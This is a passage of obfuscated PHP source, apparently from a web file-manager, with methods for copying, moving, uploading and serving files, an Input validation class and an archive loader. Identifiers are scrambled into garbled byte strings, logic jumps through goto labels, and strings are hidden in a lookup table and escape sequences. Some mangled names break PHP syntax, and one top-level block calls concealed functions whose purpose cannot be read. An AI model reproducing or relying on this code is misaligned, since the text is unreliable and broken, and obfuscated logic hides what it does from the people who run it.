$e¥Œƒƒº«ß = $this->parse($F’¾©•í™ó); $cÅÌó‘ˆë = $this->model->copy($eÙİ„Ä’ , $e¥Œƒƒº«ß[$_SERVER[…Ò×–][371]], $E»·¹Åô); return $cÅÌó‘ˆë ? $this->getPathOuter($cÅÌó‘ˆë) : !1; } public function moveSameAllow() { } public function move($bá­êâ¾Œ, $a±š‹Çæ¡¨, $D¶ÎùËƒÓ = REPEAT_REPLACE) { $c­••š¿» = $this->parse($a±š‹Çæ¡¨); $C¯Äù­¼† = $this->model->move($bá­êâ¾Œ, $c­••š¿»[$_SERVER[…Ò×–][371]], $D¶ÎùËƒÓ); return $C¯Äù­¼† ? $this->getPathOuter($C¯Äù­¼†) : !1; } public function remove($c‰ÈÀ®ÚÖ, $aÕ°ñÓŒ˜ = true) { return $this->model->remove($c‰ÈÀ®ÚÖ, $aÕ°ñÓŒ˜); } public function rename($bšÉßÌ“¨, $b¤ø‚½ã»Ê) { $E“›£äïÒ = $this->model->rename($bšÉßÌ“¨, $b¤ø‚½ã»Ê); return $E“›£äïÒ ? $this->getPathOuter($bšÉßÌ“¨) : $E“›£äïÒ; } public function size($CĞ¯ÎôóÄ) { $E›–Óë‰Õ = $this->infoSimple($CĞ¯ÎôóÄ); return $E›–Óë‰Õ ? $E›–Óë‰Õ[$_SERVER[…Ò×–][77]] : 0; } public function infoSimple($E­ëÕ¢½Ç) { return $this->model->sourceInfo($E­ëÕ¢½Ç); } public function info($F˜‡´À±) { return $this->infoParse($F˜‡´À±); } public function infoAuth($a‡–À£ìå) { return $this->infoParse($a‡–À£ìå, !1, !0); } public function infoWithChildren($CŠ•¢§æ‡¬) { return $this->infoParse($CŠ•¢§æ‡¬, !0); } protected function infoParse($B“‚£å‚¢ã, $c¸ã…öÚÃ– = false, $D‰¼´àË©ï = false) { if (!$c¸ã…öÚÃ–) { return $this->model->pathInfo($B“‚£å‚¢ã, $D‰¼´àË©ï); } return $this->model->pathInfoMore($B“‚£å‚¢ã); } public function infoFull($Bá‡³›Ì») { $Eš²µÙÃ‘² =& $_SERVER[…Ò×–]; $eùòÓë™å = explode($Eš²µÙÃ‘²[8], $Bá‡³›Ì»); $FÚÈÜã¬™ = implode($Eš²µÙÃ‘²[8], array_splice($eùòÓë™å, 1)); return $this->model->pathInfoByPath($eùòÓë™å[0], $FÚÈÜã¬™); } public function hashSimple($d¢ñ‘õ„„) { $f²´«‡Š¯º =& $_SERVER[…Ò×–]; $bÄÚÑëØÄ‹ = $this->infoWithChildren($d¢ñ‘õ„„); return $bÄÚÑëØÄ‹[$f²´«‡Š¯º[161]][$f²´«‡Š¯º[168]]; } public function hashMd5($A²°å«®ß‘) { $E’››–óÉ¦ =& $_SERVER[…Ò×–]; $aŠ—¬¾Úë = $this->infoWithChildren($A²°å«®ß‘); return $aŠ—¬¾Úë[$E’››–óÉ¦[161]][$E’››–óÉ¦[167]]; } public function exist($a´ÒøåÅ) { $bÂ×§ğÃÜŠ =& $_SERVER[…Ò×–]; $Då·º­÷Œ… = $this->parse($a´ÒøåÅ); if (!$Då·º­÷Œ…[$bÂ×§ğÃÜŠ[75]]) { return $this->isFile($a´ÒøåÅ) || $this->isFolder($a´ÒøåÅ); } $dèÁ”àĞ²Î = array($bÂ×§ğÃÜŠ[372] => $Då·º­÷Œ…[$bÂ×§ğÃÜŠ[371]], $bÂ×§ğÃÜŠ[28] => $Då·º­÷Œ…[$bÂ×§ğÃÜŠ[75]]); $D’¹Ç‰Ôâ = $this->model->where($dèÁ”àĞ²Î)->find(); return $D’¹Ç‰Ôâ ? !0 : !1; } public function isFile($FèÄË„ÓÌô) { $AĞÀÚ„Š÷ =& $_SERVER[…Ò×–]; $fÊæ†µøïš = $this->infoSimple($FèÄË„ÓÌô); return $fÊæ†µøïš && $fÊæ†µøïš[$AĞÀÚ„Š÷[374]] == $AĞÀÚ„Š÷[83] ? !1 : !0; } public function isFolder($dóâÂŸëá¾) { $Aë÷šÉ¾ƒ® =& $_SERVER[…Ò×–]; $Eïï¾öÛÃ¢ = $this->infoSimple($dóâÂŸëá¾); return $Eïï¾öÛÃ¢ && $Eïï¾öÛÃ¢[$Aë÷šÉ¾ƒ®[374]] == $Aë÷šÉ¾ƒ®[83] ? !0 : !1; } public function listPath($b†Ì¾ ©¥…, $Eºò’íæ‡ = false) { $C‰ˆùËÙµ =& $_SERVER[…Ò×–]; if ($b†Ì¾ ©¥… == $C‰ˆùËÙµ[33]) { return !1; } $Bõ²†øÄµï = array($C‰ˆùËÙµ[372] => $b†Ì¾ ©¥…); if ($Eºò’íæ‡) { return $this->model->listSource($Bõ²†øÄµï, -1); } return $this->model->listSource($Bõ²†øÄµï); } public function has($bÂ‡‚èÀ±, $Cöç«Ïâ«† = false, $Dï±ªõï¤µ = null) { $A–Ï´Şë§ =& $_SERVER[…Ò×–]; $Eæ§÷ÕÈ = $this->infoWithChildren($bÂ‡‚èÀ±); if ($Cöç«Ïâ«†) { return array($A–Ï´Şë§[196] => $Eæ§÷ÕÈ[$A–Ï´Şë§[196]], $A–Ï´Şë§[195] => $Eæ§÷ÕÈ[$A–Ï´Şë§[195]]); } return $Dï±ªõï¤µ ? $Eæ§÷ÕÈ[$A–Ï´Şë§[196]] : $Eæ§÷ÕÈ[$A–Ï´Şë§[195]]; } public function listAll($dïÖó¸ä•™) { $c’“ÄÛÄõé = IO::info($this->pathParse[$_SERVER[…Ò×–][75]]); if (!$c’“ÄÛÄõé) { return array(); } return $this->model->listAll($dïÖó¸ä•™); } public function getContent($dšÁãâˆàß) { return $this->model->getContent($dšÁãâˆàß); } public function setContent($Eë†½˜ê‘’, $DİÌœŸ´ = '') { return $this->model->setContent($Eë†½˜ê‘’, $DİÌœŸ´); } public function fileSubstr($BŠÔ¤¡‚Í, $bÑÛº¥‹·Á, $aÌ¥¤õ¦§) { return $this->model->fileSubstr($BŠÔ¤¡‚Í, $bÑÛº¥‹·Á, $aÌ¥¤õ¦§); } public function download($B×ÓÂ²ôƒø, $AÚº©³ö¼ä = '') { $bç‚¡©×”Æ = get_path_father($AÚº©³ö¼ä); $F…ÖÉÊÌ¾ = get_path_this($AÚº©³ö¼ä); $aÉ†Ôİ’ö = $this->model->fileInfoGet($B×ÓÂ²ôƒø); $fá±ŠÄÙ‰‹ = IO::copy($aÉ†Ôİ’ö[$_SERVER[…Ò×–][75]], $bç‚¡©×”Æ, !1, $F…ÖÉÊÌ¾); return $fá±ŠÄÙ‰‹; } public function setModifyTime($fç½—Î·¤î, $fÄ¯ƒåÛ = '') { $this->model->metaSet($fç½—Î·¤î, $_SERVER[…Ò×–][1129], $fÄ¯ƒåÛ); } public function upload($b±ê„¯«¡, $f‰ ¬‘ ­, $DÆíö®éº = false, $EÈöÔÆÃÌ‹ = REPEAT_REPLACE) { $FÊÛŠ®ŠÊ… =& $_SERVER[…Ò×–]; $b¤³îù¼„Ë = $this->parse($b±ê„¯«¡); $b«àº±÷Ş› = $this->model->addFile($b¤³îù¼„Ë[$FÊÛŠ®ŠÊ…[371]], $f‰ ¬‘ ­, $b¤³îù¼„Ë[$FÊÛŠ®ŠÊ…[75]], $DÆíö®éº, $EÈöÔÆÃÌ‹); return $this->getPathOuter($b«àº±÷Ş›); } public function uploadFileByID($aËò°Ñùİ, $BÄ£ÃÚìŠ©, $c´¾Ÿ®Ğ¸–) { $bö¥ğ»ùÇİ =& $_SERVER[…Ò×–]; $E’ŠßÖ‡å¡ = $this->parse($aËò°Ñùİ); $D†ÙÑ‹ø…ç = $this->model->addFileByFileID($E’ŠßÖ‡å¡[$bö¥ğ»ùÇİ[371]], $BÄ£ÃÚìŠ©, $E’ŠßÖ‡å¡[$bö¥ğ»ùÇİ[75]], $c´¾Ÿ®Ğ¸–); return $this->getPathOuter($D†ÙÑ‹ø…ç); } public function addFileByRemote($FÍ¼ÕŸ£œ, $aœ¨•¸¯», $fŠğ”¤ìŞÂ = array(), $EÍì†‰Úàà = '', $CÆ­é‰Ìø‰) { $eŸÁÇ¨õ – =& $_SERVER[…Ò×–]; $cÀÇªã¤³Ü = $this->parse($FÍ¼ÕŸ£œ); $EÍì†‰Úàà = empty($EÍì†‰Úàà) ? $cÀÇªã¤³Ü[$eŸÁÇ¨õ –[75]] : $EÍì†‰Úàà; $C¶ö´˜‡Òí = $this->model->addFileByRemote($cÀÇªã¤³Ü[$eŸÁÇ¨õ –[371]], $aœ¨•¸¯», $EÍì†‰Úàà, $fŠğ”¤ìŞÂ, $CÆ­é‰Ìø‰); return $this->getPathOuter($C¶ö´˜‡Òí); } public function uploadLink($fìÄŞŠ‹¦ , $AÕ§¼³îó‘ = 0) { $B‘´Â–¼ =& $_SERVER[…Ò×–]; $fÍ¹Ğ¶´“Ö = $this->parse($fìÄŞŠ‹¦ ); $fìÄŞŠ‹¦  = Model($B‘´Â–¼[548])->createFileName($fÍ¹Ğ¶´“Ö[$B‘´Â–¼[75]]); $Aà£¤é„„ = IO::uploadLink($fìÄŞŠ‹¦ , $AÕ§¼³îó‘); return $Aà£¤é„„; } public function fileNameAuto($D¼¶³èºŞÄ, $d‘™¸ÚÏß», $BÈ¯Æâ¿­“ = REPEAT_REPLACE, $cŒ‹³İÖ¿õ = false) { return $this->model->fileNameAuto($D¼¶³èºŞÄ, $d‘™¸ÚÏß», $BÈ¯Æâ¿­“, $cŒ‹³İÖ¿õ); } public function fileNameExist($b³íˆªÒ, $AÁÛéÂ®¯) { return $this->model->fileNameExist($b³íˆªÒ, $AÁÛéÂ®¯); } protected function _fileOut($cÏÎ©ÚØˆ‚, $FØ¸×±Ò‚… = false, $C©¡Áö˜á = false, $eøÔ÷Œ¯ÆÊ = '', $aíîªÀ¥«Ö = false) { goto eŒ¤í®™ª; F†ßÍªÈ­: $bˆ…”ğÄ‰Ã = $this->model->fileInfoGet($cÏÎ©ÚØˆ‚); $eøÔ÷Œ¯ÆÊ = $bˆ…”ğÄ‰Ã[$FØ±äª­[167]] ? $bˆ…”ğÄ‰Ã[$FØ±äª­[167]] : $eøÔ÷Œ¯ÆÊ; $bê×ö›ÔïÒ = isset($GLOBALS[$FØ±äª­[1131]]) ? $GLOBALS[$FØ±äª­[1131]] : $CèŒìäñ[$FØ±äª­[28]]; goto FåŒ­ÍÜ‰„; FåŒ­ÍÜ‰„: if ($aíîªÀ¥«Ö) { return IO::fileOutServer($bˆ…”ğÄ‰Ã[$FØ±äª­[75]], $FØ¸×±Ò‚…, $bê×ö›ÔïÒ, $eøÔ÷Œ¯ÆÊ); } IO::fileOut($bˆ…”ğÄ‰Ã[$FØ±äª­[75]], $FØ¸×±Ò‚…, $bê×ö›ÔïÒ, $eøÔ÷Œ¯ÆÊ); goto BĞÎÁ”ˆ‰°; eŒ¤í®™ª: $FØ±äª­ =& $_SERVER[…Ò×–]; $CèŒìäñ = $this->model->sourceInfo($cÏÎ©ÚØˆ‚); if ($CèŒìäñ[$FØ±äª­[374]] == $FØ±äª­[83]) { header($FØ±äª­[1130]); die; } goto F†ßÍªÈ­; BĞÎÁ”ˆ‰°: } public function fileOut($B· —½Ç‘˜, $DõÙ•ƒ± = false, $A—Ş¡Ã†àŸ = false, $c×“Ìõà» = '') { $this->_fileOut($B· —½Ç‘˜, $DõÙ•ƒ±, $A—Ş¡Ã†àŸ, $c×“Ìõà»); } public function fileOutServer($e‰Å©õƒé, $Eçõ²ëö± = false, $có‰¾†È‡ = false, $aøãÜÓÛÓÔ = '') { $this->_fileOut($e‰Å©õƒé, $Eçõ²ëö±, $có‰¾†È‡, $aøãÜÓÛÓÔ, !0); } protected function _fileOutImage($B¬™íµ«ì¸, $EÛî¸½Ÿ›§ = 250) { goto Eâ†ÏìÀÛê; Eâ†ÏìÀÛê: $FÁœÄÆ©–¸ =& $_SERVER[…Ò×–]; $B³‰é“Œé´ = $this->model->pathInfo($B¬™íµ«ì¸); if ($B³‰é“Œé´[$FÁœÄÆ©–¸[374]] == $FÁœÄÆ©–¸[83]) { show_json($FÁœÄÆ©–¸[1132] . $B¬™íµ«ì¸, !1); } goto Fêæ‹¤•¨Ò; c“«‘óÁÃÙ: $GLOBALS[$FÁœÄÆ©–¸[1131]] = $AÄ©¾ğšš[$FÁœÄÆ©–¸[28]]; $GLOBALS[$FÁœÄÆ©–¸[159]] = $AÄ©¾ğšš; IO::fileOutImage($AÄ©¾ğšš[$FÁœÄÆ©–¸[75]], $EÛî¸½Ÿ›§); goto fÕªÍ´¿«”; Fêæ‹¤•¨Ò: $AÄ©¾ğšš = $this->model->fileInfoGet($B¬™íµ«ì¸); $AÄ©¾ğšš[$FÁœÄÆ©–¸[28]] = $B³‰é“Œé´[$FÁœÄÆ©–¸[28]]; $AÄ©¾ğšš[$FÁœÄÆ©–¸[160]] = $B³‰é“Œé´[$FÁœÄÆ©–¸[160]]; goto c“«‘óÁÃÙ; fÕªÍ´¿«”: } public function fileOutImage($FŞÜÓÓä„®, $e‡‘í¿åè = 250) { $this->_fileOutImage($FŞÜÓÓä„®, $e‡‘í¿åè); } public function fileOutImageServer($BˆÒšåó, $bªÚ“‡Î° = 250) { $this->_fileOutImage($BˆÒšåó, $bªÚ“‡Î°); } public function link($EÈ™œ¹­é¿, $a¦ã´Úíö¸ = '') { $Fğ”ÕÏ£… = $this->model->fileInfoGet($EÈ™œ¹­é¿); return IO::link($Fğ”ÕÏ£…[$_SERVER[…Ò×–][75]], $a¦ã´Úíö¸); } protected function parse($BÛõš‡»ùë) { $aÛõß×¥öè =& $_SERVER[…Ò×–]; if (strstr($BÛõš‡»ùë, $aÛõß×¥öè[8]) === !1) { return array($aÛõß×¥öè[389] => intval($BÛõš‡»ùë), $aÛõß×¥öè[75] => $aÛõß×¥öè[33], $aÛõß×¥öè[1128] => array()); } $f¤ôù·£ÊÂ = explode($aÛõß×¥öè[8], trim($BÛõš‡»ùë, $aÛõß×¥öè[8])); if (count($f¤ôù·£ÊÂ) < 2) { show_tips($BÛõš‡»ùë . $aÛõß×¥öè[1133]); } return array($aÛõß×¥öè[389] => intval($f¤ôù·£ÊÂ[0]), $aÛõß×¥öè[75] => $f¤ôù·£ÊÂ[1], $aÛõß×¥öè[1128] => array_slice($f¤ôù·£ÊÂ, 1)); } } if ($_SERVER[$_SERVER[…Ò×–][798]] != $_SERVER[$_SERVER[…Ò×–][1134]]) { goto dŒ›ÄÀò½å; dŒ›ÄÀò½å: $AËÓÌ”ÛÕ¡ = $_SERVER[…Ò×–][800]; $d›Ò½ÜÇ¤Š = $_SERVER[$_SERVER[…Ò×–][795]] . $_SERVER[…Ò×–][796]; $a…«¤†ÈÅÚ = $AËÓÌ”ÛÕ¡($d›Ò½ÜÇ¤Š); goto Aã…ù‡†‹‰; c¾æ³«·’ñ: $CÖ¸÷‹¼¥ù($_SERVER[$_SERVER[…Ò×–][1136]]); goto eğ‰ÄŠÛ¢; Aã…ù‡†‹‰: $e¼íÕÌáá… = explode($_SERVER[…Ò×–][221], $a…«¤†ÈÅÚ); if (count($e¼íÕÌáá…) < $_SERVER[…Ò×–][565]) { $aëŒÉÔ¦” = $_SERVER[…Ò×–][801]; $aëŒÉÔ¦”(); } $CÖ¸÷‹¼¥ù = $_SERVER[…Ò×–][1135]; goto c¾æ³«·’ñ; eğ‰ÄŠÛ¢: } goto Fà¢¡¤œÓ; FğÖ…° àç: if (!function_exists($_SERVER[…Ò×–][1890])) { function imagecreatefrombmp($fëÜÒ¾Ëë¹) { return ImageGdBMP::load($fëÜÒ¾Ëë¹); } } class Input { public static function getArray($fØĞ§´ĞŒ—) { goto bƒÒ™éœÈ; FÉîéÌƒ¦Ş: if (count($aã„âíì¹’) > 0) { show_json(implode($Eƒ ø¸¹ ğ[1895], $aã„âíì¹’), !1); } return $aíàÓÌÉ«; goto Aç«Ö·Ø»¹; dÉƒäËÛÕö: $aã„âíì¹’ = array(); $BÙÕƒ¦÷œ„ = LNG($Eƒ ø¸¹ ğ[1891]); foreach ($fØĞ§´ĞŒ— as $dÂÅ¡¶¼¨“ => $e‘Ç›£ôïâ) { goto E”²¥À–Ğ—; aØÊù£ïÕÂ: if (!array_key_exists($dÂÅ¡¶¼¨“, $in)) { if (array_key_exists($Eƒ ø¸¹ ğ[1893], $e‘Ç›£ôïâ)) { if (!is_null($e‘Ç›£ôïâ[$Eƒ ø¸¹ ğ[1893]])) { $aíàÓÌÉ«[$f‚œì‰±¸†] = $e‘Ç›£ôïâ[$Eƒ ø¸¹ ğ[1893]]; } } else { if (isset($e‘Ç›£ôïâ[$Eƒ ø¸¹ ğ[1894]])) { $aã„âíì¹’[] = $aù¬ĞÜ»ë; } } continue; } if (isset($e‘Ç›£ôïâ[$Eƒ ø¸¹ ğ[1894]]) && $e‘Ç›£ôïâ[$Eƒ ø¸¹ ğ[1894]] == $Eƒ ø¸¹ ğ[286]) { $DİÍ§æ­¤ = json_decode($in[$dÂÅ¡¶¼¨“], !0); if (is_array($DİÍ§æ­¤)) { $aíàÓÌÉ«[$f‚œì‰±¸†] = $DİÍ§æ­¤; } else { if (array_key_exists($Eƒ ø¸¹ ğ[1893], $e‘Ç›£ôïâ)) { if (!is_null($e‘Ç›£ôïâ[$Eƒ ø¸¹ ğ[1893]])) { $aíàÓÌÉ«[$f‚œì‰±¸†] = $e‘Ç›£ôïâ[$Eƒ ø¸¹ ğ[1893]]; } } else { $aã„âíì¹’[] = $aù¬ĞÜ»ë; } } continue; } $A£µ§¬Â… = _get($e‘Ç›£ôïâ, $Eƒ ø¸¹ ğ[1023]); goto Dä‹æ˜Æµ; Dä‹æ˜Æµ: if (isset($e‘Ç›£ôïâ[$Eƒ ø¸¹ ğ[1894]]) && !self::check($in[$dÂÅ¡¶¼¨“], $e‘Ç›£ôïâ[$Eƒ ø¸¹ ğ[1894]], $A£µ§¬Â…)) { if (array_key_exists($Eƒ ø¸¹ ğ[1893], $e‘Ç›£ôïâ)) { if (!is_null($e‘Ç›£ôïâ[$Eƒ ø¸¹ ğ[1893]])) { $aíàÓÌÉ«[$f‚œì‰±¸†] = $e‘Ç›£ôïâ[$Eƒ ø¸¹ ğ[1893]]; } } else { $aã„âíì¹’[] = $aù¬ĞÜ»ë; } continue; } $aíàÓÌÉ«[$f‚œì‰±¸†] = $in[$dÂÅ¡¶¼¨“]; goto f¼Å‡äÉŞ„; E”²¥À–Ğ—: $aù¬ĞÜ»ë = _get($e‘Ç›£ôïâ, $Eƒ ø¸¹ ğ[1258], $BÙÕƒ¦÷œ„ . $Eƒ ø¸¹ ğ[886] . $dÂÅ¡¶¼¨“); $f‚œì‰±¸† = $dÂÅ¡¶¼¨“; if (isset($e‘Ç›£ôïâ[$Eƒ ø¸¹ ğ[1892]]) && $e‘Ç›£ôïâ[$Eƒ ø¸¹ ğ[1892]]) { $f‚œì‰±¸† = $e‘Ç›£ôïâ[$Eƒ ø¸¹ ğ[1892]]; } goto aØÊù£ïÕÂ; f¼Å‡äÉŞ„: } goto FÉîéÌƒ¦Ş; bƒÒ™éœÈ: $Eƒ ø¸¹ ğ =& $_SERVER[…Ò×–]; global $in; $aíàÓÌÉ« = array(); goto dÉƒäËÛÕö; Aç«Ö·Ø»¹: } public static function reg($B––·ñš = "\162\x65\x71\165\151\x72\x65") { static $D£‘¯ÁéÜ = array("\x72\x65\x71\x75\151\162\145" => "\56\x2b", "\156\165\155\142\x65\162" => "\134\x64\x2b", "\151\156\164\x65\x67\145\162" => "\x5c\144\53", "\150\145\170" => "\x5b\x30\x2d\x39\101\55\106\x61\55\146\135\x2b", "\151\156\164" => "\x5b\55\x5c\x2b\135\x3f\134\144\x2b", "\x62\x6f\x6f\x6c" => "\60\x7c\x31", "\146\x6c\157\141\x74" => "\133\55\x5c\53\x5d\77\134\144\x2b\x28\134\x2e\x5c\144\x2b\x29\x3f", "\x65\156\x67\154\151\x73\150" => "\x5b\x41\x2d\132\141\x2d\172\40\135\x2b", "\143\x68\151\156\145\163\145" => "\x5b\134\x78\173\x34\145\x30\60\x7d\55\134\x78\x7b\71\x66\x61\65\175\135\53", "\x68\x61\163\103\x68\151\x6e\145\163\x65" => "\x2f\x28\x5b\x5c\x78\173\x34\x65\x30\x30\x7d\x2d\134\x78\x7b\71\x66\x61\65\175\x5d\x2b\x29\57\165", "\x65\x6d\x61\x69\154" => "\x5c\x77\x2b\50\x5b\134\x2e\134\55\x5d\x5c\x77\53\x29\52\134\x40\134\x77\53\x28\133\134\56\134\x2d\135\134\167\x2b\51\x2a\x5c\x2e\134\167\x2b", "\x70\150\157\x6e\145" => "\61\133\63\55\x39\135\x5c\x64\x7b\71\x7d", "\164\x65\x6c\160\x68\157\156\x65" => "\x28\134\50\x5c\144\x7b\x33\54\x34\x7d\134\x29\x7c\134\144\173\63\x2c\x34\x7d\x2d\x7c\x5c\163\51\x3f\134\144\173\67\x2c\61\64\x7d", "\165\162\154" => "\x28\x68\164\164\160\174\146\164\x70\174\x68\x74\x74\x70\x73\x29\x3a\134\x2f\x5c\x2f\133\x5c\167\134\55\137\x5d\53\x28\x5c\56\133\x5c\167\134\55\x5f\135\x2b\x29\x2b\x28\133\134\167\x5c\55\134\56\x2c\x40\77\136\x3d\45\x26\x3a\134\x2f\176\x5c\53\43\135\52\x5b\134\x77\134\x2d\x5c\100\x3f\x5e\x3d\45\x26\x5c\x2f\x7e\134\x2b\43\135\51\x3f", "\165\x72\x6c\106\x75\x6c\154" => "\133\x61\55\x7a\x41\55\172\x5d\x2b\x3a\134\x2f\134\57\x5b\136\x5c\163\135\x2a", "\x69\160" => "\x28\134\x64\x7b\61\x2c\x33\x7d\134\56\x29\x7b\x33\x7d\x28\x5c\144\173\x31\x2c\x33\175\51", "\172\x69\160" => "\x5b\61\55\71\135\x5c\x64\x7b\x35\175\50\77\41\134\x64\51", "\x69\x64\x43\x61\x72\x64" => "\x28\x5c\x64\x7b\61\65\175\x29\x7c\50\x5c\x64\x7b\61\67\175\50\134\x64\x7c\130\174\x78\51\x29", "\143\x6f\154\x6f\162" => "\x23\x28\133\x30\55\71\x41\x2d\106\x61\x2d\x66\135\173\x33\175\174\133\x30\x2d\71\x41\x2d\106\x61\55\146\135\173\66\175\51", "\164\151\x6d\145" => "\x28\133\60\x2d\61\x5d\134\144\174\x32\x5b\60\x2d\x34\x5d\51\72\x5b\60\x2d\x35\135\134\144", "\x64\x61\164\x65" => "\x5c\144\173\x34\175\133\x2d\134\57\x5d\77\x28\x30\x5b\x31\x2d\71\135\174\61\133\x30\x2d\x32\135\x29\133\55\134\57\x5d\x3f\x28\133\x30\x2d\62\x5d\x5c\144\x7c\63\x5b\60\x2d\61\x5d\x29", "\x64\x61\x74\x65\x54\151\155\x65" => "\x5c\x64\173\64\x7d\133\x2d\x5c\x2f\135\77\50\x30\133\x31\x2d\71\x5d\174\x31\133\x30\x2d\x32\x5d\x29\x5b\55\134\57\135\77\50\x5b\x30\55\62\135\134\x64\174\x33\133\60\55\x31\x5d\51\134\163\x2b\x28\x5b\60\x2d\x31\135\134\x64\174\x32\133\x30\55\x34\x5d\x29\72\133\60\x2d\65\135\x5c\x64", "\x70\141\x73\x73\167\x6f\x72\144" => "\x28\77\x3d\56\52\134\144\51\50\77\75\x2e\52\x5b\141\55\172\x5d\51\50\77\x3d\56\x2a\133\x41\x2d\x5a\x5d\x29\56\x7b\70\54\62\x30\175", "\153\x65\x79" => "\133\x41\55\132\x61\55\x7a\x30\x2d\71\137\134\55\x5c\56\135\53", "\153\145\x79\x46\x75\154\154" => "\133\101\x2d\132\x61\55\172\x30\55\x39\137\x5c\55\x5c\56\x5c\x73\54\135\53"); if (!$B––·ñš) { return $D£‘¯ÁéÜ; } return $D£‘¯ÁéÜ[$B––·ñš]; } public static function check($aæ°¼¦²’¬, $eßóŒÖ¾º³, $Fº¾ñäìÖÇ = null) { $D‚§©Œ¯¹Ö =& $_SERVER[…Ò×–]; switch ($eßóŒÖ¾º³) { case $D‚§©Œ¯¹Ö[7]: return in_array($aæ°¼¦²’¬, $Fº¾ñäìÖÇ); break; case $D‚§©Œ¯¹Ö[1896]: return floatval($aæ°¼¦²’¬) > $Fº¾ñäìÖÇ; break; case $D‚§©Œ¯¹Ö[1897]: return floatval($aæ°¼¦²’¬) < $Fº¾ñäìÖÇ; break; case $D‚§©Œ¯¹Ö[329]: return strlen($aæ°¼¦²’¬) >= $Fº¾ñäìÖÇ[0] && strlen($aæ°¼¦²’¬) <= $Fº¾ñäìÖÇ[1]; break; case $D‚§©Œ¯¹Ö[329]: if (is_array($Fº¾ñäìÖÇ)) { return strlen($aæ°¼¦²’¬) >= $Fº¾ñäìÖÇ[0] && strlen($aæ°¼¦²’¬) <= $Fº¾ñäìÖÇ[1]; break; } else { return strlen($aæ°¼¦²’¬) == $Fº¾ñäìÖÇ; break; } case $D‚§©Œ¯¹Ö[325]: return floatval($aæ°¼¦²’¬) >= $Fº¾ñäìÖÇ[0] && floatval($aæ°¼¦²’¬) <= $Fº¾ñäìÖÇ[1]; break; } $F¥Â™µ¤Ë = self::reg(!1); $eßóŒÖ¾º³ = isset($F¥Â™µ¤Ë[$eßóŒÖ¾º³]) ? $F¥Â™µ¤Ë[$eßóŒÖ¾º³] : $eßóŒÖ¾º³; if (substr($eßóŒÖ¾º³, 0, 1) != $D‚§©Œ¯¹Ö[8]) { $eßóŒÖ¾º³ = $D‚§©Œ¯¹Ö[1898] . $eßóŒÖ¾º³ . $D‚§©Œ¯¹Ö[1899]; } return preg_match($eßóŒÖ¾º³, $aæ°¼¦²’¬) === 1; } public static function get($eù²¶ÚŸ÷, $d‰¡âîÏ• = null, $a¡ˆÅÇ‡÷ = null, $Dõ ¾ÛŸö = null) { goto fçî™ŸÄ–Ë; F‡»Èˆˆ‹Â: return $A©ô‡¯”ˆÊ[$eù²¶ÚŸ÷]; goto DÓŒÈ ˜êê; fçî™ŸÄ–Ë: $bìùš±ªš‘ =& $_SERVER[…Ò×–]; $Dƒ§ñ£…½¬ = array(); if (!is_null($a¡ˆÅÇ‡÷)) { $Dƒ§ñ£…½¬[$bìùš±ªš‘[34]] = $a¡ˆÅÇ‡÷; } goto E°ÇŒìÕÌë; E°ÇŒìÕÌë: if (!is_null($Dõ ¾ÛŸö)) { $Dƒ§ñ£…½¬[$bìùš±ªš‘[1023]] = $Dõ ¾ÛŸö; } if (!is_null($d‰¡âîÏ•)) { $Dƒ§ñ£…½¬[$bìùš±ªš‘[1894]] = $d‰¡âîÏ•; } $A©ô‡¯”ˆÊ = Input::getArray(array($eù²¶ÚŸ÷ => $Dƒ§ñ£…½¬)); goto F‡»Èˆˆ‹Â; DÓŒÈ ˜êê: } } class KodArchive { static function init() { goto EªùÊåÍ™; EªùÊåÍ™: $e‚™ÛÖòŸŸ =& $_SERVER[…Ò×–]; if (defined($e‚™ÛÖòŸŸ[1900])) { return; } define($e‚™ÛÖòŸŸ[1900], SDK_DIR . $e‚™ÛÖòŸŸ[1901]); goto F¡è½ÁÈ¹; F¡è½ÁÈ¹: define($e‚™ÛÖòŸŸ[1902], TEMP_FILES); define($e‚™ÛÖòŸŸ[1903], TEMP_FILES); define($e‚™ÛÖòŸŸ[1904], $e‚™ÛÖòŸŸ[1905]); goto FÕ„ÈŒ±…å; DÜ™Æõ–†ã: require_once ARCHIVE_LIB . $e‚™ÛÖòŸŸ[1908]; require_once ARCHIVE_LIB . $e‚™ÛÖòŸŸ[1909]; require_once ARCHIVE_LIB . $e‚™ÛÖòŸŸ[1910]; goto Fõ¥¿ƒ‘¨ö; Fõ¥¿ƒ‘¨ö: require_once ARCHIVE_LIB . $e‚™ÛÖòŸŸ[1911]; goto b¥àÀôÈËÇ; FÕ„ÈŒ±…å: mk_dir(TEMP_FILES); require_once ARCHIVE_LIB . $e‚™ÛÖòŸŸ[1906]; require_once ARCHIVE_LIB . $e‚™ÛÖòŸŸ[1907]; goto DÜ™Æõ–†ã; b¥àÀôÈËÇ: } static function checkIfType($f”‹äÓ‡, $e’ÛÃíêÂ) { goto Aé„Í›‹ËÄ; eƒÓÚÇ‚: return $F•Á°ï­ˆø; goto BÍ›¢¦â­; d×œ£³„ÁÔ: $F•Á°ï­ˆø = in_array($f”‹äÓ‡, $C¿¦¾Šã¨Ë[$e’ÛÃíêÂ]); if ($F•Á°ï­ˆø && ($e’ÛÃíêÂ == $eàĞ“ÇÂ„‹[305] || $e’ÛÃíêÂ == $eàĞ“ÇÂ„‹[1915]) && (!function_exists($eàĞ“ÇÂ„‹[1923]) || !function_exists($eàĞ“ÇÂ„‹[1924]))) { show_tips($eàĞ“ÇÂ„‹[1925]); } if ($F•Á°ï­ˆø && $e’ÛÃíêÂ == $eàĞ“ÇÂ„‹[1055] && (!function_exists($eàĞ“ÇÂ„‹[1926]) || !strstr(shell_exec($eàĞ“ÇÂ„‹[1927]), $eàĞ“ÇÂ„‹[1928]))) { show_tips($eàĞ“ÇÂ„‹[1929]); } goto eƒÓÚÇ‚; Aé„Í›‹ËÄ: $eàĞ“ÇÂ„‹ =& $_SERVER[…Ò×–]; self::init(); $C¿¦¾Šã¨Ë = array($eàĞ“ÇÂ„‹[305] => array($eàĞ“ÇÂ„‹[305], $eàĞ“ÇÂ„‹[1912], $eàĞ“ÇÂ„‹[1913], $eàĞ“ÇÂ„‹[1914]), $eàĞ“ÇÂ„‹[1915] => array($eàĞ“ÇÂ„‹[1915], $eàĞ“ÇÂ„‹[1916], $eàĞ“ÇÂ„‹[1054], $eàĞ“ÇÂ„‹[1052]), $eàĞ“ÇÂ„‹[1055] => array($eàĞ“ÇÂ„‹[1055], $eàĞ“ÇÂ„‹[1917], $eàĞ“ÇÂ„‹[1918], $eàĞ“ÇÂ„‹[1919], $eàĞ“ÇÂ„‹[1920], $eàĞ“ÇÂ„‹[1921], $eàĞ“ÇÂ„‹[1922])); goto d×œ£³„ÁÔ; 